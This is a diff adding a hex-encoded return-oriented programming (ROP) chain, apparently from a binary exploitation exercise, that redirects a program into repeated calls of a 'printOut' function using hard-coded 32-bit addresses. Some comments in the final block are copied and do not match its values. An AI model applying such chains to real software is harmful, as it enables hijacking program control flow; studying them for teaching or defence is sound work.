@@ -1,0 +1,30 @@
+; Convert with
+; xxd -r -p rop.xxd rop.bin
+; Remove all comments!
+
+10 85 04 08	; Address of the printOut function
+02 00 00 00 	; File descriptor number
+9a a0 04 08 	; Address of string in buffer
+0F 00 00 00 	; Length of the string
+
+10 85 04 08 	; Address of the printOut function
+02 00 00 00 	; File descriptor number
+f1 a0 04 08 	; Address of string '\n' in buffer
+01 00 00 00 	; Length of string
+
+10 85 04 08 	; Address of the printOut function
+02 00 00 00 	; File descriptor number
+e0 a0 04 08 	; Address of string in buffer
+10 00 00 00 	; Length of the string
+
+10 85 04 08 	; Address of the printOut function
+02 00 00 00 	; File descriptor number
+f1 a0 04 08 	; Address of string '\n' in buffer
+01 00 00 00 	; Length of string
+
+22 85 04 08 	; Address of the printOut function
+00 00 00 00 	; File descriptor number 0
+00 00 00 00 	; Address of string '\n' in buffer
+00 00 00 00 	; Length of string
+
+20 85 04 08 	; Return!
